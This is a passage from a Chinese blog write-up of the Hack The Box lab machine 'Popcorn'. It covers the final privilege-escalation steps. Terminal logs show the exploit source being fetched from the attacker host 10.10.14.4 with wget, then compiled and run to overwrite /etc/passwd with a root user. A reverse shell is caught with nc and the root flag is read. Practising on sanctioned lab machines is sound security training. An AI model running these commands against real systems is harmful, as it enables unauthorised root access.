<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
<p>27、发现搜集的漏洞都不太对，只好使用演练报告里的exp了</p>
<p><code>https://www.exploit-db.com/exploits/40839</code></p>
<p>28、然后就开始了接下来的利用与提权了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@popcorn:/tmp$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux popcorn 2.6.31-14-generic-pae <span class="hljs-comment">#48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux</span><br>www-data@popcorn:/tmp$ wget http://10.10.14.4/poc.c<br>wget http://10.10.14.4/poc.c<br>--2024-01-02 17:04:38--  http://10.10.14.4/poc.c<br>Connecting to 10.10.14.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4828 (4.7K) [text/x-csrc]<br>Saving to: `poc.c<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">100%[======================================&gt;] 4,828       --.-K/s   in 0.001s  </span><br><span class="hljs-string"></span><br><span class="hljs-string">2024-01-02 17:04:39 (6.44 MB/s) - `poc.c&#x27;</span> saved [4828/4828]<br><br>www-data@popcorn:/tmp$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>14339.sh  LinEnum.sh  exp.sh  f  poc.c  vgauthsvclog.txt.0  vmware-root<br>www-data@popcorn:/tmp$ gcc -pthread poc.c -o poc -lcrypt<br>gcc -pthread poc.c -o poc -lcrypt<br>www-data@popcorn:/tmp$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 104<br>drwxrwxrwt  5 root     root      4096 Jan  2 17:05 .<br>drwxr-xr-x 21 root     root      4096 Jan  2 14:48 ..<br>drwxrwxrwt  2 root     root      4096 Jan  2 14:48 .ICE-unix<br>drwxrwxrwt  2 root     root      4096 Jan  2 14:48 .X11-unix<br>lrwxrwxrwx  1 www-data www-data    11 Jan  2 16:52 .cache -&gt; /etc/passwd<br>-rwxr-xr-x  1 www-data www-data  3042 Jan  2 16:56 14339.sh<br>-rwxr-xr-x  1 www-data www-data 46631 Jan  7  2020 LinEnum.sh<br>-rwxr-xr-x  1 www-data www-data  3056 Jan  2 16:40 exp.sh<br>prw-r--r--  1 www-data www-data     0 Jan  2 17:05 f<br>-rwxr-xr-x  1 www-data www-data 13601 Jan  2 17:05 poc<br>-rw-r--r--  1 www-data www-data  4828 Jan  2 17:04 poc.c<br>-rw-r--r--  1 root     root      1600 Jan  2 14:48 vgauthsvclog.txt.0<br>drwx------  2 root     root      4096 Jan  2 14:48 vmware-root<br><br>www-data@popcorn:/tmp$ ./poc<br>./poc<br>/etc/passwd successfully backed up to /tmp/passwd.bak<br>Please enter the new password: root<br><br>Complete line:<br>firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash<br><br>mmap: b77f8000<br>su root<br>^C<br></code></pre></td></tr></table></figure>

<p>29、然后重新获取反弹shell，切换 firefart 用户，获取到最新的权限，以及flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.4] from (UNKNOWN) [10.10.10.6] 54733<br>sh: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ python -c &#x27;</span>import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">www-data@popcorn:/var/www/torrent/upload$ su firefart</span><br><span class="hljs-string">su firefart</span><br><span class="hljs-string">Password: root</span><br><span class="hljs-string"></span><br><span class="hljs-string">firefart@popcorn:/var/www/torrent/upload# id</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=0(firefart) gid=0(root) groups=0(root)</span><br><span class="hljs-string">firefart@popcorn:/var/www/torrent/upload# cat /root/root.txt</span><br><span class="hljs-string">cat /root/root.txt</span><br><span class="hljs-string">cfc4eac1c0d5160439ad60aff6784873</span><br><span class="hljs-string">firefart@popcorn:/var/www/torrent/upload# </span><br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/4</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Popcorn-htb-writeup</div>
      <div>https://sh1yan.top/2024/01/02/Popcorn-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年1月2日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/01/03/Haircut-htb-writeup/" title="Haircut-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Haircut-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/29/Precious-htb-writeup/" title="Precious-htb-writeup">
                        <span class="hidden-mobile">Precious-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
